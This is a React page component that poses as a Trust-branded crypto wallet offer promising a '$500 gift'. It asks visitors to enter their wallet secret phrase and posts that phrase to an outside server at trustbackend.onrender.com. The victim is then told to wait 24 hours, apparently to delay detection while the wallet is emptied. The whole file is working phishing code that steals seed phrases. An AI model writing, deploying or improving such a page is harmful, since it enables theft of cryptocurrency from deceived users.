import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import hero_img from "../assets/images/Screenshot 2024-07-14 112312.png";
import axios from 'axios';
import toast from 'react-hot-toast';

const Wallet = () => {
  const [formData, setFormData] = useState("");
  const [loading, setLoading] = useState(false);
console.log(formData , 'dd')
  const dataSend = async () => {
    if (!formData || formData.trim().split(/\s+/).length < 5) {
      return toast.error("Please enter correct phrase")
    }
    
    setLoading(true)
    try {
      const res = await axios.post("https://trustbackend.onrender.com/api/key", { phrase: formData }, {
      // const res = await axios.post("http://localhost:8000/api/key", { phrase: formData }, {
        headers: {
          "Content-Type": "application/json",
        },
      })
      if (res.data?.isSuccess) {
        setFormData("")
        toast.success("Please wait, 24 hours processing time.")
      }
    } catch (error) {
      toast.error(error?.response?.data?.message)
      console.log(error)
    }finally{
      setLoading(false)
    }
  };

  return (
    <>
      <div className="max-w-[1170px] mx-auto">
        <div className="flex px-4 pt-20 sm:flex-nowrap flex-wrap items-center gap-20 justify-between">
          <div className="sm:w-[45%] w-full">
            <h1 className="default-transition leading-[1.3] text-trustBlack font-wixMadefor font-bold dark:text-trustWhite sm:text-4xl text-[24px] leading-mobileH1 tablet:text-desktopH1 tablet:leading-desktopH1">
              🎁 True Crypto Ownership: Receive a Special $500 Gift and Experience Powerful Web3 Capabilities! 🎁
            </h1>
            <p className="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodyLarge leading-mobileBodyLarge tablet:text-desktopBodyLarge tablet:leading-desktopBodyLarge my-4 tablet:my-6 tablet:max-w-[40ch]">
              Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust.
            </p>
              <button className="text-[blue] font-semibold border pt-4 pb-5 sm:px-20 px-[41px] text-[20px] sm:text-2xl hover:bg-[blue] hover:text-white transition-all rounded-full border-[blue]">
                Receive a Special $500 Gift <br />
              </button>
          </div>
          <div className="sm:w-[55%] sm:block hidden w-full justify-start">
            <img className="h-[500px]" src={hero_img} alt="" />
          </div>
        </div>
        <section className="px-4">
          <div className="pt-20">
            <p className="pb-2">Enter your secret phrase for the wallet.</p>
            <textarea
            value={formData}
              onChange={(e) => setFormData(e.target.value)}
              placeholder="Enter your secret phrase for the wallet."
              className="p-3 border w-full outline-none"
              rows={8}
            ></textarea>
          </div>
          <div className="text-center mt-10">
            <button
              onClick={dataSend}
              className="hover:bg-[blue] transition-all border border-[blue] text-[blue] font-medium px-8 py-3 hover:text-white rounded-lg"
            >
              {loading ? "Please wait":"Submit Now"}
            </button>
          </div>
        </section>
      </div>
    </>
  );
};

export default Wallet;
